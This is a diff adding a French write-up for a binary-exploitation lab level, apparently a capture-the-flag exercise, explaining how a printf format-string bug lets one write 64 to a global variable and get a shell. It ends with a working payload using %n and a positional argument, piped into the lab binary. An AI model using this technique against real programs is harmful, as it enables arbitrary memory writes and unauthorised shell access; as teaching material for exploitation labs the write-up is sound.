@@ -1,0 +1,45 @@
+Le disas du main montre un appel direct à la fonction `v`.
+Les insctructions de `v` montrent l'utilisation de `fgets`, ainsi qu'à `printf`.
+On voit aussi qu'une comparaison est faite entre le contenu de `0x0804988c` et 64 (0x40), qui, si elle est égale, ouvre un shell avec `/bin/sh`.
+
+Le but de l'exercice est donc de mettre `0x0804988c` à 0x40.
+
+On peut essayer de calculer les différents offsets utilisés dans le programme :
+ - la stack a une taille de 536
+ - le buffer a une taille de 512, commence à 16 bytes du début de la stack et fini à 8 de la fin de la stack
+
+On peut donc imaginer le contenu de la mémoire lors de l'appel à `fgets` :
+```txt
+bffff52000000200b7fd1ac0b7ff37d0...............
+└──────┘└──────┘└──────┘└──────┘└─────────────╌
+ buffer   512    stdout   ???    buffer content
+```
+
+Nous avons un gros avantage, c'est qu'on peut choisir la string de format ! Et dans tous les arguments disponibles pour `printf`, un est particulièrement intéressant : `%n`. Ce dernier va écrire le nombre de caractères imprimés à sa position à l'adresse pointée par le paramètre correspondant.
+Une autre fonctionnalité très intéressante du format est le dollar, qui permet de choisir quel est l'index du paramètre que l'on souhaite utiliser.
+
+La mémoire étant totalement alignée, on a donc une fonction pour choisir l'index auquel on souhaite accéder et une fonction pour y écrire.
+
+Voici ce que l'on souhaite atteindre dans la mémoire :
+```txt
+        bffff52000000200b7fd1ac0b7ff37d00804988c
+        └──────┘└──────┘└──────┘└──────┘└──────┘
+arg. n°: format  1       2       3       4
+```
+
+On peut donc écrire notre string qui va écrire 64 dans `0x0804988c`.
+
+```txt
+\x8c\x98\x04\x08%60d%4$n
+└──────────────┘└┬─┘└──┘
+   0x0804988c    │   write 64 in the fourth parameter
+                 │   (size of address + 60)
+                 │
+          any number with
+           a size of 60
+```
+
+Voici le résultat final :
+```bash
+(echo $'\x8c\x98\x04\x08%60d%4$n'; cat) | ./level3
+```
